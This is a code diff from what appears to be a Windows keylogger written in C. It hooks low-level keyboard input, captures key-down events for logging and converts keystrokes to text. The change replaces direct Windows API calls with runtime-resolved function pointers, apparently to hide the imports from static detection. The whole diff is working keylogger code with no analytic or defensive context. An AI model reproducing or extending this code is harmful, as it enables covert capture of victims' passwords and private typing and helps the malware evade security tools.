@@ -25,20 +25,20 @@ LRESULT WINAPI hook_callback(const int code, const WPARAM wparam,
 	if (code == HC_ACTION && wparam == WM_KEYDOWN)
 		log_kbd((KBDLLHOOKSTRUCT*)lparam);
 
-	return CallNextHookEx(hook, code, wparam, lparam);
+	return LpCallNextHookEx(hook, code, wparam, lparam);
 }
 
-BOOL set_keyboard_hook()
+BOOL set_keyboard_hook(VOID)
 {
-	hook = SetWindowsHookExW(WH_KEYBOARD_LL, hook_callback, NULL, 0);
+	hook = LpSetWindowsHookEx(WH_KEYBOARD_LL, hook_callback, NULL, 0);
 
 	return hook != NULL;
 }
 
-void get_keyboard_state(BYTE* buff, const size_t size)
+void get_keyboard_state(BYTE *const buff, const SIZE_T size)
 {
 	for (size_t i = 0; i < size; i++) {
-		const SHORT key_state = GetKeyState(i);
+		const SHORT key_state = LpGetKeyState(i);
 
 		/*
 		 * Right shifts the high order bit by 8 to avoid a narrowing
@@ -54,15 +54,15 @@ BOOL is_key_down(const DWORD vk_code)
 	 * Right shifts the high order bit by 15 to obtain the virtual key's
 	 * up/down status.
 	 */
-	return GetKeyState(vk_code) >> 15;
+	return LpGetKeyState(vk_code) >> 15;
 }
 
-int kbd_to_unicode(const KBDLLHOOKSTRUCT* kbd_hook, const LPWSTR buff,
+int kbd_to_unicode(const KBDLLHOOKSTRUCT *const kbd_hook, const LPWSTR buff,
 		   const size_t size)
 {
 	BYTE state[KEYBOARD_STATE_SIZE];
 	get_keyboard_state(state, KEYBOARD_STATE_SIZE);
 
-	return ToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, state, buff,
+	return LpToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, state, buff,
 			 size, 0);
 }
